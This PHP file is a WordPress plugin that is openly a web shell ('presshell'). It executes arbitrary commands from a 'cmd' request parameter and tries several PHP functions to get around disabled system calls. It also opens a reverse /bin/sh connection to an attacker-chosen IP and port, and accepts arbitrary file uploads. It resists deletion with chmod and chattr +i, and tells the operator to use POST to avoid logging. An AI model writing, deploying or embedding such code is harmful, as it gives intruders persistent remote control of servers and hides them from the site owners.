<?php

/*
 * Plugin Name: Quick & dirty Wordpress Command Execution Shell
 * Plugin URI: https://github.com/scheatkode/presshell
 * Description: Execute shell commands on your wordpress server
 * Author: scheatkode
 * Version: 0.4.1
 * Author URI: https://scheatkode.github.io
 */

// attempt to protect myself from deletion.
$this_file = __FILE__;
@system("chmod ugo-w $this_file > /dev/null 2>&1");
@system("chattr +i   $this_file > /dev/null 2>&1");

// name of the parameter (GET or POST) for the command.
// change   this  if  the  target   already   use  this
// parameter.
$cmd = 'cmd';

// name of the parameter  (POST) for the uploaded file.
// change  this   if  the   target  already   use  this
// parameter.
$file = 'file';

// name  of the  parameter  (GET or  POST)  for the  ip
// address. change this if  the target already use this
// parameter.
$ip = 'ip';

// name of the parameter (GET  or POST) for the port to
// listen  on. change  this if  the target  already use
// this parameter.
$port = 'port';

/**
 * try to execute a command using various techniques
 *
 * @param string $command command to run
 * @return bool whether one of the techniques was used to run the command
 */
function executeCommand(string $command)
{
   // try  to  find a  way  to  run our  command  using
   // various php internals.

   if (class_exists('ReflectionFunction')) {
      // http://php.net/manual/en/class.reflectionfunction.php
      $function = new ReflectionFunction('system');
      $function->invoke($command);
      return true;
   }

   if (function_exists('call_user_func_array')) {
      // http://php.net/manual/en/function.call-user-func-array.php
      call_user_func_array('system', array($command));
      return true;
   }

   if (function_exists('call_user_func')) {
      // http://php.net/manual/en/function.call-user-func.php
      call_user_func('system', $command);
      return true;
   }

   if (function_exists('passthru')) {
      // https://www.php.net/manual/en/function.passthru.php
      ob_start();
      passthru($command, $return_var);
      ob_flush();
      return true;
   }

   if (function_exists('system')) {
      // this  is  the  last resort.  chances  are  php
      // subhosting has system() on a blacklist anyways
      // :>
      // http://php.net/manual/en/function.system.php
      system($command);
      return true;
   }

   return false;
}

/**
 * open a reverse shell using the given parameters
 *
 * @param string $ip ip address to use
 * @param string $port port use
 * @return string|false error message if an error happened, false otherwise
 */
function openReverseShell(string $ip, string $port)
{
   $command = '/bin/sh -i <&3 >&3 2>&3';
   $socket  = fsockopen($ip, $port, $errcode, $errmsg);

   if (!$socket) {
      return "Could not open socket for $ip:$port: $errmsg";
   }

   // notify on execution failure
   if (!executeCommand($command)) {
      return 'The command failed to run';
   }

   return false;
}

/**
 * check whether there is an ongoing upload.
 *
 * @param mixed $upload variable from `$_FILES`
 * @return bool whether to handle a file upload
 */
function isRequestFileUpload($upload)
{
   if (empty($upload)) {
      return false;
   }

   if (
         !file_exists($upload['tmp_name'])
      || !is_uploaded_file($upload['tmp_name'])
   ) {
      return false;
   }

   return true;
}

/**
 * handle a file upload
 *
 * @param array $upload value from `$_FILES[...]`
 * @return string|false error message if an error happened, false otherwise
 */
function handleFileUpload(array $upload)
{
   if (!empty($upload['error'])) {
      return $upload['error'];
   }

   $filename = __DIR__ . "/${upload['name']}";

   if (!move_uploaded_file($upload['tmp_name'], $filename)) {
      return 'upload finalization';
   }

   return false;
}

// warn about noisy get requests
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
   echo "\e[0;33mWarning\e[0m: \e[0;31mGET\e[0m requests are most likely logged,";
   echo " better use \e[0;32mPOST\e[0m instead\n\n";
}

// test if  parameter 'cmd', 'ip or  'port' is present.
// if not  this will avoid an  error on logs or  on all
// pages if badly configured.

if (isset($_REQUEST[$cmd])) {
   // grab the  command we want  to run from  the 'cmd'
   // get or  post parameter (post doesn't  display the
   // command on  apache logs) and notify  on execution
   // failure
   if (!executeCommand($_REQUEST[$cmd])) {
      echo "\e[0;31mError\e[0m: The command failed to run\n";
   }
} elseif (isset($_REQUEST[$ip])) {
   // default port 443
   $port = isset($_REQUEST[$port])
      ? $_REQUEST[$port]
      : '443';

   $ret = openReverseShell($_REQUEST[$ip], $port);

   if ($ret) {
      echo "\e[0;31mError reverse shell setup\e[0m: ${ret}\n";
   }
} elseif (isRequestFileUpload($_FILES[$file])) {
   $ret = handleFileUpload($_FILES[$file]);

   if ($ret) {
      echo "\e[0;31mError during upload\e[0m: ${ret}\n";
   }
}

die();
